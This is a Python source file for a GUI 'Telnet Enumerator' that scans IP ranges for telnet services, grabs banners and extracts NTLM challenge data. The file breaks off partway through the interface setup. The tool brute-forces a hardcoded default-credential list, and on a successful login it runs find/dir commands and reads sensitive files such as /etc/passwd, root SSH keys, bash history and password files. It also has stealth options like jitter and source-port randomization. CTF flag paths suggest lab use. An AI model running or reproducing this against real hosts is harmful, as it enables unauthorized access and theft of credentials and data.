#!/usr/bin/env python3
"""
Telnet Enumerator - A GUI tool for enumerating telnet ports
"""

import socket
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
from typing import Optional, List, Dict, Tuple
import queue
import time
import json
import csv
from datetime import datetime
import ipaddress
import base64
import struct
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from logging.handlers import RotatingFileHandler
import traceback


# Configure logging
def setup_logging():
    """Set up logging configuration for the application"""
    # Create logger
    logger = logging.getLogger('telnet_enumerator')
    logger.setLevel(logging.DEBUG)
    
    # Create file handler with rotation (max 5MB, keep 3 backups)
    log_file = 'telnet_enumerator.log'
    file_handler = RotatingFileHandler(
        log_file, 
        maxBytes=5*1024*1024,  # 5 MB
        backupCount=3
    )
    file_handler.setLevel(logging.DEBUG)
    
    # Create console handler for warnings and errors
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.WARNING)
    
    # Create formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    # Add formatter to handlers
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    # Add handlers to logger
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger


# Initialize logger
logger = setup_logging()


class TelnetEnumerator:
    """Main class for telnet port enumeration"""
    
    # Common default credentials for telnet services
    DEFAULT_CREDENTIALS = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ('root', 'admin'),
        ('admin', '1234'),
        ('user', 'user'),
        ('guest', 'guest'),
        ('support', 'support'),
        ('admin', ''),
        ('root', ''),
        ('ubnt', 'ubnt'),
        ('pi', 'raspberry'),
    ]
    
    # Common files to try to scrub from telnet servers
    COMMON_LINUX_FILES = [
        '/etc/passwd',
        '/etc/hosts',
        '/etc/hostname',
        '/etc/issue',
        '/etc/os-release',
        '/proc/version',
        '/proc/cpuinfo',
        '/etc/ssh/sshd_config',
        '/etc/network/interfaces',
        '/root/.ssh/authorized_keys',
        '/root/.bash_history',
        # Common CTF text files
        '/root/flag.txt',
        '/root/user.txt',
        '/root/root.txt',
        '/home/user/flag.txt',
        '/home/user/user.txt',
        '/flag.txt',
        '/user.txt',
        '/root.txt',
        'flag.txt',
        'user.txt',
        'note.txt',
        'notes.txt',
        'readme.txt',
        'README.txt',
        'todo.txt',
        'passwords.txt',
        'creds.txt',
        # Common CTF image files (may contain steganography)
        '/root/flag.jpg',
        '/root/flag.png',
        '/home/user/flag.jpg',
        '/home/user/flag.png',
        'flag.jpg',
        'flag.png',
        'image.jpg',
        'image.png',
    ]
    
    COMMON_WINDOWS_FILES = [
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\win.ini',
        'C:\\boot.ini',
        # Common CTF text files
        'C:\\Users\\Administrator\\Desktop\\flag.txt',
        'C:\\Users\\Administrator\\Desktop\\user.txt',
        'C:\\Users\\Administrator\\Desktop\\root.txt',
        'C:\\flag.txt',
        'C:\\user.txt',
        'C:\\root.txt',
        'flag.txt',
        'user.txt',
        'note.txt',
        'notes.txt',
        'readme.txt',
        'README.txt',
        'todo.txt',
        'passwords.txt',
        'creds.txt',
        # Common CTF image files (may contain steganography)
        'C:\\Users\\Administrator\\Desktop\\flag.jpg',
        'C:\\Users\\Administrator\\Desktop\\flag.png',
        'C:\\flag.jpg',
        'C:\\flag.png',
        'flag.jpg',
        'flag.png',
        'image.jpg',
        'image.png',
    ]
    
    # File viewing constants
    MAX_FILE_CONTENT_LENGTH = 2000  # Maximum characters to capture per file
    FILE_PREVIEW_LENGTH = 500  # Maximum characters to display in preview
    MAX_PREVIEW_LINES = 10  # Maximum lines to show in file preview
    BUFFER_CLEAR_TIMEOUT = 0.5  # Timeout for clearing socket buffer (seconds)
    COMMAND_DELAY = 0.5  # Delay after sending command (seconds)
    RESPONSE_TIMEOUT = 1.0  # Timeout for receiving response (seconds)
    MAX_DISCOVERED_FILES = 100  # Maximum number of discovered files to attempt reading
    
    # File extensions to search for when discovering files
    TEXT_EXTENSIONS = ['txt', 'log', 'conf', 'config', 'md', 'csv', 'json', 'xml', 'yaml', 'yml', 'ini', 'sh', 'bat', 'ps1']
    IMAGE_EXTENSIONS = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'tif', 'tiff', 'svg']
    
    def __init__(self):
        self.default_port = 23
        self.timeout = 3
        self.encryption_check_delay = 0.5  # Delay in seconds for encryption response
        self.max_workers = 10  # Default thread pool size for concurrent scanning
        self.jitter_min = 0.0  # Minimum delay between scans (seconds)
        self.jitter_max = 0.0  # Maximum delay between scans (seconds)
        self.randomize_order = False  # Whether to randomize scan order
        self.randomize_source_port = False  # Whether to randomize source port for stealth
        self.files_to_view = []  # List of file paths to view when credentials are valid
        self.auto_scrub_files = False  # Whether to automatically discover and view files
    
    def _check_encryption_support(self, sock: socket.socket) -> str:
        """
        Check if the Telnet server supports encryption
        
        Telnet encryption is negotiated using Telnet options as defined in:
        - RFC 2946: Telnet Data Encryption Option
        - RFC 854: Telnet Protocol Specification
        
        Args:
            sock: Active socket connection to the telnet server
            
        Returns:
            str: 'supported', 'not_supported', or 'unknown'
        """
        try:
            # Telnet protocol constants
            IAC = b'\xff'   # Interpret As Command
            DO = b'\xfd'    # Request the other party to perform an option
            DONT = b'\xfe'  # Request the other party not to perform an option
            WILL = b'\xfb'  # Indicates willingness to perform an option
            WONT = b'\xfc'  # Indicates refusal to perform an option
            SB = b'\xfa'    # Subnegotiation begin
            SE = b'\xf0'    # Subnegotiation end
            
            # Telnet option codes
            ENCRYPT = b'\x26'  # Encryption option (38 decimal)
            
            # Set a short timeout for this operation
            sock.settimeout(2)
            
            # First, receive any initial data/options from server
            try:
                initial_data = sock.recv(1024)
            except socket.timeout:
                initial_data = b''
            
            # Send IAC DO ENCRYPT to ask if server supports encryption
            encryption_query = IAC + DO + ENCRYPT
            sock.send(encryption_query)
            
            # Wait for response
            time.sleep(self.encryption_check_delay)
            response = sock.recv(1024)
            
            # Parse the response for encryption support
            if IAC + WILL + ENCRYPT in response:
                return 'supported'
            elif IAC + WONT + ENCRYPT in response:
                return 'not_supported'
            else:
                # Check if the server sent any encryption-related subnegotiation
                if ENCRYPT in response and SB in response:
                    return 'supported'
                # If no clear response, return unknown
                return 'unknown'
                
        except socket.timeout:
            return 'unknown'
        except Exception:
            return 'unknown'
    
    def _extract_ntlm_info(self, sock: socket.socket) -> Optional[Dict]:
        """
        Attempt to extract NTLM authentication information from telnet server
        
        Based on RFC 2941 (Telnet Authentication Option) and MS-TNAP specification.
        
        Args:
            sock: Active socket connection to the telnet server
            
        Returns:
            dict with NTLM information or None if not available
        """
        try:
            # Telnet protocol constants
            IAC = b'\xff'
            WILL = b'\xfb'
            DO = b'\xfd'
            DONT = b'\xfe'
            WONT = b'\xfc'
            SB = b'\xfa'
            SE = b'\xf0'
            
            # Authentication option (37 decimal, 0x25 hex)
            AUTH = b'\x25'
            
            sock.settimeout(5)
            
            # Receive initial banner/negotiation
            try:
                initial_data = sock.recv(4096)
            except socket.timeout:
                initial_data = b''
            
            # Send WILL AUTHENTICATION to indicate we want to authenticate
            auth_will = IAC + WILL + AUTH
            sock.send(auth_will)
            
            time.sleep(0.3)  # Reduced from 0.5 for speed
            
            # Receive server's response
            try:
                response = sock.recv(4096)
            except socket.timeout:
                return None
            
            # Look for authentication subnegotiation
            if IAC + SB + AUTH in response:
                # Extract NTLM challenge if present
                return self._parse_ntlm_challenge(response)
            
            return None
            
        except Exception:
            return None
    
    def _parse_ntlm_challenge(self, data: bytes) -> Optional[Dict]:
        """
        Parse NTLM challenge from telnet authentication data
        
        Args:
            data: Raw bytes from telnet authentication negotiation
            
        Returns:
            dict with parsed NTLM information or None
        """
        try:
            ntlm_info = {}
            
            # Look for NTLM signature "NTLMSSP"
            ntlm_sig = b'NTLMSSP\x00'
            if ntlm_sig in data:
                ntlm_offset = data.index(ntlm_sig)
                ntlm_data = data[ntlm_offset:]
                
                # Parse message type (should be 0x02000000 for Type 2 Challenge)
                if len(ntlm_data) >= 12:
                    msg_type = struct.unpack('<I', ntlm_data[8:12])[0]
                    
                    if msg_type == 2:  # Type 2 Challenge Message
                        ntlm_info['message_type'] = 'NTLM_CHALLENGE'
                        
                        # Extract target name (domain) if available
                        if len(ntlm_data) >= 20:
                            target_name_len = struct.unpack('<H', ntlm_data[12:14])[0]
                            target_name_offset = struct.unpack('<I', ntlm_data[16:20])[0]
                            
                            if len(ntlm_data) >= target_name_offset + target_name_len:
                                try:
                                    target_name = ntlm_data[target_name_offset:target_name_offset + target_name_len].decode('utf-16-le', errors='ignore')
                                    if target_name:
                                        ntlm_info['target_name'] = target_name
                                except (UnicodeDecodeError, AttributeError):
                                    pass
                        
                        # Extract challenge (8 bytes at offset 24)
                        if len(ntlm_data) >= 32:
                            challenge = ntlm_data[24:32]
                            ntlm_info['challenge'] = base64.b64encode(challenge).decode('ascii')
                        
                        # Extract flags if available
                        if len(ntlm_data) >= 24:
                            flags = struct.unpack('<I', ntlm_data[20:24])[0]
                            ntlm_info['flags'] = hex(flags)
                        
                        # Try to extract version information if available (offset 48)
                        if len(ntlm_data) >= 56:
                            try:
                                version_data = ntlm_data[48:56]
                                major = version_data[0]
                                minor = version_data[1]
                                build = struct.unpack('<H', version_data[2:4])[0]
                                ntlm_info['version'] = f"{major}.{minor}.{build}"
                            except (struct.error, IndexError):
                                pass
                        
                        return ntlm_info
            
            return None
            
        except (struct.error, IndexError, ValueError):
            return None
    
    def _is_valid_file_path(self, path: str) -> bool:
        """
        Check if a string looks like a valid file path
        
        Args:
            path: String to check
            
        Returns:
            True if it looks like a file path, False otherwise
        """
        if not path or len(path) < 2:
            return False
        
        # Unix absolute path
        if path.startswith('/'):
            return True
        
        # Unix relative path
        if path.startswith('./') or path.startswith('../'):
            return True
        
        # Windows absolute path (e.g., C:\path)
        if len(path) > 2 and path[1] == ':' and path[2] in ('\\', '/'):
            return True
        
        return False
    
    def _discover_files_via_telnet(self, sock: socket.socket) -> List[str]:
        """
        Discover text, image files, and directories on the target system through telnet
        
        Args:
            sock: Active authenticated socket connection
            
        Returns:
            List of discovered file paths (up to MAX_DISCOVERED_FILES)
        """
        logger.info("Starting file discovery via telnet")
        discovered_files = []
        
        # Combine extensions once for efficiency
        all_extensions = self.TEXT_EXTENSIONS + self.IMAGE_EXTENSIONS
        
        # Build find command for Linux (searches common directories)
        text_exts = '|'.join([f'\\.{ext}$' for ext in self.TEXT_EXTENSIONS])
        image_exts = '|'.join([f'\\.{ext}$' for ext in self.IMAGE_EXTENSIONS])
        all_exts = text_exts + '|' + image_exts
        
        # Try multiple discovery strategies
        # Note: These commands search sensitive directories and assume proper access control
        # is in place. Errors from inaccessible directories are suppressed with 2>/dev/null
        discovery_commands = [
            # Linux: Find files in common directories with more detail (PRIORITIZED)
            f'find /root /home /tmp /var /opt /etc /usr/local -type f -size -10M 2>/dev/null | grep -E "({all_exts})" | head -n {self.MAX_DISCOVERED_FILES}',
            # Linux: List all files recursively in home directories
            'find /root /home -type f -size -10M 2>/dev/null | head -n 100',
            # Linux: Find recently modified files
            'find /root /home /tmp -type f -mtime -30 -size -10M 2>/dev/null | head -n 50',
            # Windows: Search in Users directory
            f'dir /s /b C:\\Users\\*.txt C:\\Users\\*.jpg C:\\Users\\*.png C:\\Users\\*.gif C:\\Users\\*.log 2>nul | findstr /i ".txt .jpg .png .gif .log" | more +1',
            # Windows: Desktop and Documents focus
            f'dir /s /b C:\\Users\\*\\Desktop\\*.* C:\\Users\\*\\Documents\\*.* 2>nul | findstr /i ".txt .jpg .png .gif .log .doc .pdf" | more +1',
            # Linux: simple ls in common directories (broader search)
            'ls -1 /root/* /home/*/* /tmp/* 2>/dev/null | grep -E "\\.(txt|jpg|png|gif|log|conf|json|xml)$" | head -n 100',
            # Current directory recursive search
            'find . -type f -maxdepth 3 2>/dev/null | head -n 50',
            # List current directory
            'ls -la 2>/dev/null || dir 2>nul',
        ]
        
        for cmd_idx, cmd in enumerate(discovery_commands):
            if len(discovered_files) >= self.MAX_DISCOVERED_FILES:
                logger.info(f"Reached max discovered files limit ({self.MAX_DISCOVERED_FILES})")
                break
                
            try:
                logger.debug(f"Attempting discovery command {cmd_idx + 1}/{len(discovery_commands)}: {cmd[:80]}...")
                
                # Clear any pending data
                sock.settimeout(self.BUFFER_CLEAR_TIMEOUT)
                try:
                    while sock.recv(4096):
                        pass
                except socket.timeout:
                    pass
                
                # Send discovery command
                sock.sendall((cmd + '\n').encode('utf-8', errors='ignore'))
                time.sleep(self.COMMAND_DELAY)
                
                # Collect response
                sock.settimeout(self.RESPONSE_TIMEOUT)
                response = b''
                try:
                    for _ in range(20):  # Read multiple chunks for longer output
                        chunk = sock.recv(4096)
                        if chunk:
                            response += chunk
                        else:
                            break
                except socket.timeout:
                    logger.debug(f"Timeout reading response for command {cmd_idx + 1}")
                    pass
                
                # Parse response to extract file paths
                if response:
                    response_text = response.decode('utf-8', errors='ignore')
                    lines = response_text.split('\n')
                    logger.debug(f"Command {cmd_idx + 1} returned {len(lines)} lines")
                    
                    files_found_in_cmd = 0
                    for line in lines:
                        line = line.strip()
                        # Filter common shell prompts (more comprehensive)
                        # Skip lines starting with common prompt characters or containing prompt patterns
                        if not line or line.startswith(('#', '$', '>', '%', '~')):
                            continue
                        if ':' in line[:20] and '@' in line[:20]:  # Likely a prompt like 'user@host:~$'
                            continue
                            
                        # Check if line contains valid file extensions
                        is_valid_file = any(line.lower().endswith(f'.{ext}') for ext in all_extensions)
                        
                        if is_valid_file:
                            # Extract file path - handle paths with spaces by taking everything
                            # that looks like a valid path (starts with / or C:\ or is relative)
                            cleaned = line
                            
                            # Remove ANSI escape codes if present
                            import re
                            ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                            cleaned = ansi_escape.sub('', cleaned)
                            
                            # If there are spaces and it doesn't start with a path indicator,
                            # it might be command output with extra info - take last token
                            if ' ' in cleaned and not self._is_valid_file_path(cleaned):
                                # This might be output like "Found: /path/to/file.txt"
                                # Try to extract path-like token
                                tokens = cleaned.split()
                                for token in reversed(tokens):  # Check from end
                                    if any(token.lower().endswith(f'.{ext}') for ext in all_extensions):
                                        cleaned = token
                                        break
                            
                            if cleaned and cleaned not in discovered_files:
                                # Validate it's actually a file path using helper function
                                if self._is_valid_file_path(cleaned):
                                    discovered_files.append(cleaned)
                                    files_found_in_cmd += 1
                                    logger.debug(f"Discovered file: {cleaned}")
                                    if len(discovered_files) >= self.MAX_DISCOVERED_FILES:
                                        break
                    
                    if files_found_in_cmd > 0:
                        logger.info(f"Command {cmd_idx + 1} discovered {files_found_in_cmd} files")
                    else:
                        logger.debug(f"Command {cmd_idx + 1} discovered no files")
                else:
                    logger.debug(f"Command {cmd_idx + 1} returned no response")
                
            except Exception as e:
                # Log the exception but continue to next discovery method
                logger.warning(f"Exception in discovery command {cmd_idx + 1}: {type(e).__name__}: {e}")
                logger.debug(f"Traceback: {traceback.format_exc()}")
                continue
        
        logger.info(f"File discovery complete. Total files discovered: {len(discovered_files)}")
        if discovered_files:
            logger.debug(f"Discovered files: {discovered_files}")
        
        return discovered_files
    
    def _view_files_via_telnet(self, sock: socket.socket, files_to_view: List[str]) -> List[Dict]:
        """
        View files through an authenticated telnet session
        
        Args:
            sock: Active authenticated socket connection
            files_to_view: List of file paths to attempt to read
            
        Returns:
            List of dicts containing file path and content
        """
        logger.info(f"Starting to view {len(files_to_view)} files via telnet")
        viewed_files = []
        
        for file_idx, file_path in enumerate(files_to_view):
            logger.debug(f"Attempting to view file {file_idx + 1}/{len(files_to_view)}: {file_path}")
            try:
                # Common commands to read files (try multiple for compatibility)
                commands = [
                    f'cat {file_path}',
                    f'type {file_path}',  # Windows
                    f'more {file_path}',
                ]
                
                file_content = None
                successful_cmd = None
                
                for cmd in commands:
                    # Clear buffer first
                    sock.settimeout(self.BUFFER_CLEAR_TIMEOUT)
                    try:
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    
                    # Send command
                    sock.settimeout(self.timeout)
                    sock.send((cmd + '\r\n').encode('utf-8'))
                    time.sleep(self.COMMAND_DELAY)
                    
                    # Receive response
                    try:
                        response = b''
                        sock.settimeout(self.RESPONSE_TIMEOUT)
                        while True:
                            try:
                                chunk = sock.recv(4096)
                                if not chunk:
                                    break
                                response += chunk
                            except socket.timeout:
                                break
                        
                        content = response.decode('utf-8', errors='ignore').strip()
                        
                        # Check if command was successful (not an error message)
                        error_keywords = [
                            'no such file', 'cannot open', 'not found', 
                            'permission denied', 'command not found', 'bad command'
                        ]
                        has_error = any(err in content.lower() for err in error_keywords)
                        
                        if content and not has_error:
                            file_content = content
                            successful_cmd = cmd
                            logger.debug(f"Successfully read {file_path} using command: {cmd}")
                            break
                        elif has_error:
                            logger.debug(f"Error reading {file_path} with {cmd}: {content[:100]}")
                    except (socket.error, OSError) as e:
                        logger.debug(f"Socket error reading {file_path} with {cmd}: {e}")
                        continue
                
                if file_content:
                    viewed_files.append({
                        'path': file_path,
                        'content': file_content[:self.MAX_FILE_CONTENT_LENGTH],
                        'size': len(file_content)
                    })
                    logger.info(f"Successfully viewed file: {file_path} ({len(file_content)} bytes)")
                else:
                    error_msg = 'Unable to read file or file not found'
                    viewed_files.append({
                        'path': file_path,
                        'content': None,
                        'error': error_msg
                    })
                    logger.warning(f"Failed to view file: {file_path} - {error_msg}")
                    
            except Exception as e:
                error_msg = f"{type(e).__name__}: {e}"
                viewed_files.append({
                    'path': file_path,
                    'content': None,
                    'error': error_msg
                })
                logger.error(f"Exception viewing file {file_path}: {error_msg}")
                logger.debug(f"Traceback: {traceback.format_exc()}")
        
        success_count = sum(1 for f in viewed_files if f.get('content'))
        logger.info(f"File viewing complete. Successfully viewed {success_count}/{len(files_to_view)} files")
        
        return viewed_files
    
    def _test_credentials(self, ip_address: str, port: int, credentials: List[Tuple[str, str]]) -> List[Dict]:
        """
        Test a list of credentials against the telnet server
        
        Args:
            ip_address: Target IP address
            port: Target port
            credentials: List of (username, password) tuples to test
            
        Returns:
            List of successful login attempts with details
        """
        logger.info(f"Testing {len(credentials)} credential pairs for {ip_address}:{port}")
        successful_logins = []
        
        for cred_idx, (username, password) in enumerate(credentials):
            logger.debug(f"Testing credential {cred_idx + 1}/{len(credentials)}: {username}:{'*' * len(password)}")
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                
                connection_result = sock.connect_ex((ip_address, port))
                
                if connection_result == 0:
                    # Wait for initial banner/prompt
                    time.sleep(0.3)  # Reduced from 0.5 for speed
                    try:
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')
                    except (socket.error, OSError) as e:
                        logger.debug(f"Failed to receive banner: {e}")
                        banner = ""
                    
                    # Send username
                    sock.send((username + '\r\n').encode('utf-8'))
                    time.sleep(0.3)  # Reduced from 0.5 for speed
                    
                    try:
                        response = sock.recv(1024).decode('utf-8', errors='ignore')
                    except (socket.error, OSError) as e:
                        logger.debug(f"Failed to receive response after username: {e}")
                        response = ""
                    
                    # Send password
                    sock.send((password + '\r\n').encode('utf-8'))
                    time.sleep(0.3)  # Reduced from 0.5 for speed
                    
                    try:
                        final_response = sock.recv(1024).decode('utf-8', errors='ignore')
                    except (socket.error, OSError) as e:
                        logger.debug(f"Failed to receive response after password: {e}")
                        final_response = ""
                    
                    # Check for successful login indicators
                    # Common success indicators in responses
                    success_indicators = [
                        'welcome', 'logged in', 'login successful', 
                        '$', '#', '>', 'shell', 'prompt', 'success'
                    ]
                    
                    # Common failure indicators
                    failure_indicators = [
                        'incorrect', 'failed', 'denied', 'invalid',
                        'login failed', 'authentication failed', 'bad password'
                    ]
                    
                    response_lower = (response + final_response).lower()
                    
                    has_success = any(indicator in response_lower for indicator in success_indicators)
                    has_failure = any(indicator in response_lower for indicator in failure_indicators)
                    
                    # If we see success indicators and no failure indicators, consider it successful
                    if has_success and not has_failure:
                        logger.info(f"Successful login for {ip_address}:{port} with username: {username}")
                        login_result = {
                            'username': username,
                            'password': password,
                            'response': (response + final_response).strip()[:200]  # Limit response length
                        }
                        
                        # Determine which files to view
                        files_to_try = []
                        if self.files_to_view:
                            files_to_try = self.files_to_view
                            logger.debug(f"Using {len(files_to_try)} user-specified files to view")
                        elif self.auto_scrub_files:
                            # Auto-scrub mode: discover files through directory enumeration
                            logger.info(f"Auto-discovery mode enabled, discovering files for {ip_address}:{port}")
                            try:
                                # Discover files using directory traversal and enumeration
                                discovered = self._discover_files_via_telnet(sock)
                                if discovered:
                                    files_to_try = discovered
                                    logger.info(f"Discovered {len(discovered)} files to view")
                                else:
                                    files_to_try = []
                                    logger.info("No files discovered")
                                
                                # Limit to MAX_DISCOVERED_FILES to avoid overwhelming output
                                if len(files_to_try) > self.MAX_DISCOVERED_FILES:
                                    logger.info(f"Limiting discovered files from {len(files_to_try)} to {self.MAX_DISCOVERED_FILES}")
                                    files_to_try = files_to_try[:self.MAX_DISCOVERED_FILES]
                                    
                            except Exception as e:
                                # If discovery fails, no files to try
                                logger.warning(f"File discovery failed: {type(e).__name__}: {e}")
                                logger.debug(f"Traceback: {traceback.format_exc()}")
                                files_to_try = []
                        
                        # If file viewing is enabled and we have files to view, try to read them
                        if files_to_try:
                            logger.info(f"Attempting to view {len(files_to_try)} files for {ip_address}:{port}")
                            try:
                                viewed_files = self._view_files_via_telnet(sock, files_to_try)
                                if viewed_files:
                                    login_result['files_viewed'] = viewed_files
                            except Exception as e:
                                # Don't fail the credential test if file viewing fails
                                error_msg = str(e)
                                login_result['file_view_error'] = error_msg
                                logger.error(f"File viewing failed: {error_msg}")
                                logger.debug(f"Traceback: {traceback.format_exc()}")
                        
                        successful_logins.append(login_result)
                    else:
                        logger.debug(f"Failed login for {ip_address}:{port} with username: {username}")
                
                sock.close()
                
            except (socket.error, OSError) as e:
                # Network errors are expected during credential testing
                logger.debug(f"Network error testing credential {username}: {e}")
                pass
            
            # Small delay between attempts to avoid overwhelming the server
            # Only add delay if jitter is not configured (avoid double delays)
            if self.jitter_max == 0:
                time.sleep(0.1)  # Reduced from 0.2 for speed
        
        logger.info(f"Credential testing complete for {ip_address}:{port}. Successful logins: {len(successful_logins)}")
        return successful_logins
    
    def check_telnet(self, ip_address: str, port: int = 23, extract_ntlm: bool = False, test_credentials: bool = False) -> dict:
        """
        Check if telnet port is open on the specified IP address
        
        Args:
            ip_address: Target IP address
            port: Port to check (default 23 for telnet)
            extract_ntlm: Whether to attempt NTLM authentication extraction
            test_credentials: Whether to test common credentials
            
        Returns:
            dict with status, banner, error, timing information, encryption support, NTLM info, and credential test results
        """
        logger.info(f"Starting telnet check for {ip_address}:{port}")
        
        # Apply jitter/delay if configured
        if self.jitter_max > 0:
            delay = random.uniform(self.jitter_min, self.jitter_max)
            logger.debug(f"Applying jitter delay: {delay:.2f}s")
            time.sleep(delay)
        
        result = {
            'ip': ip_address,
            'port': port,
            'status': 'closed',
            'banner': None,
            'error': None,
            'response_time': None,
            'encryption_support': None,
            'ntlm_info': None,
            'credential_results': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            # Create socket connection with source port randomization for stealth
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Randomize source port for stealth (bind to random high port)
            if self.randomize_source_port:
                try:
                    random_port = random.randint(10000, 65000)
                    # Bind to loopback or any interface depending on target IP
                    # For client sockets, binding to '' (any interface) is standard practice
                    # as we're making outbound connections, not listening for inbound
                    sock.bind(('0.0.0.0', random_port))
                    logger.debug(f"Using random source port: {random_port}")
                except (OSError, socket.error) as e:
                    # If binding fails, proceed without source port randomization
                    logger.debug(f"Failed to bind to random port: {e}")
                    pass
            
            sock.settimeout(self.timeout)
            
            # Measure connection time
            start_time = time.time()
            connection_result = sock.connect_ex((ip_address, port))
            connect_time = time.time() - start_time
            
            if connection_result == 0:
                result['status'] = 'open'
                result['response_time'] = round(connect_time * 1000, 2)  # Convert to milliseconds
                logger.info(f"Port {ip_address}:{port} is OPEN (response time: {result['response_time']}ms)")
                
                # Check for encryption support
                try:
                    result['encryption_support'] = self._check_encryption_support(sock)
                    logger.debug(f"Encryption support: {result['encryption_support']}")
                except Exception as e:
                    # Don't fail the entire check if encryption detection fails
                    error_msg = f"Encryption check failed: {str(e)}"
                    result['error'] = error_msg
                    logger.warning(f"{error_msg} for {ip_address}:{port}")
                
                # Try to grab banner
                try:
                    sock.send(b'\r\n')
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    if banner:
                        result['banner'] = banner
                        logger.debug(f"Banner grabbed: {banner[:100]}")
                except Exception as e:
                    error_msg = f"Banner grab failed: {str(e)}"
                    if result['error']:
                        result['error'] += f"; {error_msg}"
                    else:
                        result['error'] = error_msg
                    logger.debug(error_msg)
            else:
                result['response_time'] = round(connect_time * 1000, 2)
                logger.info(f"Port {ip_address}:{port} is CLOSED")
            
            sock.close()
            
            # Attempt NTLM extraction if requested and port is open
            if extract_ntlm and result['status'] == 'open':
                logger.info(f"Attempting NTLM extraction for {ip_address}:{port}")
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((ip_address, port))
                    ntlm_info = self._extract_ntlm_info(sock)
                    if ntlm_info:
                        result['ntlm_info'] = ntlm_info
                        logger.info(f"NTLM info extracted for {ip_address}:{port}")
                    else:
                        logger.debug(f"No NTLM info available for {ip_address}:{port}")
                    sock.close()
                except Exception as e:
                    error_msg = f"NTLM extraction failed: {str(e)}"
                    if result['error']:
                        result['error'] += f"; {error_msg}"
                    else:
                        result['error'] = error_msg
                    logger.warning(f"{error_msg} for {ip_address}:{port}")
                    logger.debug(f"Traceback: {traceback.format_exc()}")
            
            # Test credentials if requested and port is open
            if test_credentials and result['status'] == 'open':
                logger.info(f"Testing credentials for {ip_address}:{port}")
                try:
                    credential_results = self._test_credentials(ip_address, port, self.DEFAULT_CREDENTIALS)
                    if credential_results:
                        result['credential_results'] = credential_results
                        logger.info(f"Found {len(credential_results)} successful credential(s) for {ip_address}:{port}")
                    else:
                        logger.debug(f"No successful credentials for {ip_address}:{port}")
                except Exception as e:
                    error_msg = f"Credential testing failed: {str(e)}"
                    if result['error']:
                        result['error'] += f"; {error_msg}"
                    else:
                        result['error'] = error_msg
                    logger.error(f"{error_msg} for {ip_address}:{port}")
                    logger.debug(f"Traceback: {traceback.format_exc()}")
            
        except socket.timeout:
            result['status'] = 'timeout'
            result['error'] = 'Connection timeout'
            logger.info(f"Connection timeout for {ip_address}:{port}")
        except socket.gaierror as e:
            result['status'] = 'error'
            result['error'] = 'Invalid IP address or hostname'
            logger.error(f"Invalid IP/hostname: {ip_address} - {e}")
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
            logger.error(f"Exception checking {ip_address}:{port} - {type(e).__name__}: {e}")
            logger.debug(f"Traceback: {traceback.format_exc()}")
        
        return result


class TelnetEnumeratorGUI:
    """GUI interface for Telnet Enumerator"""
    
    # Constants
    MAX_BANNER_LINES = 10
    WINDOW_HEIGHT = 750
    
    def __init__(self, root):
        self.root = root
        self.root.title("Telnet Enumerator - Advanced Edition")
        self.root.geometry(f"900x{self.WINDOW_HEIGHT}")
        self.root.resizable(True, True)
        
        self.enumerator = TelnetEnumerator()
        self.scan_thread = None
        self.result_queue = queue.Queue()
        self.scan_results = []  # Store all scan results
        self.files_viewed_data = []  # Store all files viewed across all scans
        self.unfiltered_file_data = []  # Store unfiltered file data for filtering
        self._file_data_map = {}  # Map tree item IDs to file data
        self.is_scanning = False
        self._filter_after_id = None  # For debouncing filter updates
        
        # Options for scanning
        self.extract_ntlm_var = tk.BooleanVar(value=False)
        self.test_credentials_var = tk.BooleanVar(value=False)
        self.view_files_var = tk.BooleanVar(value=False)
        self.auto_scrub_var = tk.BooleanVar(value=False)
        self.randomize_order_var = tk.BooleanVar(value=False)
        self.use_jitter_var = tk.BooleanVar(value=False)
        
        self.setup_ui()
        self.check_queue()
    
    def setup_ui(self):
        """Setup the GUI components"""
        
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(1, weight=1)
        main_frame.rowconfigure(5, weight=1)
        
        # Title
        title_label = ttk.Label(main_frame, text="Telnet Port Enumerator - Advanced Edition", 
                               font=('Helvetica', 16, 'bold'))
        title_label.grid(row=0, column=0, columnspan=3, pady=(0, 20))
        
        # IP Address input
        ttk.Label(main_frame, text="IP Address/CIDR:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.ip_entry = ttk.Entry(main_frame, width=30)
        self.ip_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5, padx=5)
        self.ip_entry.insert(0, "127.0.0.1")
        ttk.Label(main_frame, text="(e.g., 192.168.1.0/24 or single IP)", font=('Helvetica', 8)).grid(row=1, column=2, sticky=tk.W)
        
        # Timeout input
        ttk.Label(main_frame, text="Timeout (sec):").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.timeout_entry = ttk.Entry(main_frame, width=30)
        self.timeout_entry.grid(row=2, column=1, sticky=(tk.W, tk.E), pady=5, padx=5)
        self.timeout_entry.insert(0, "3")
        
        # Thread count input
        ttk.Label(main_frame, text="Threads:").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.threads_entry = ttk.Entry(main_frame, width=30)
        self.threads_entry.grid(row=3, column=1, sticky=(tk.W, tk.E), pady=5, padx=5)
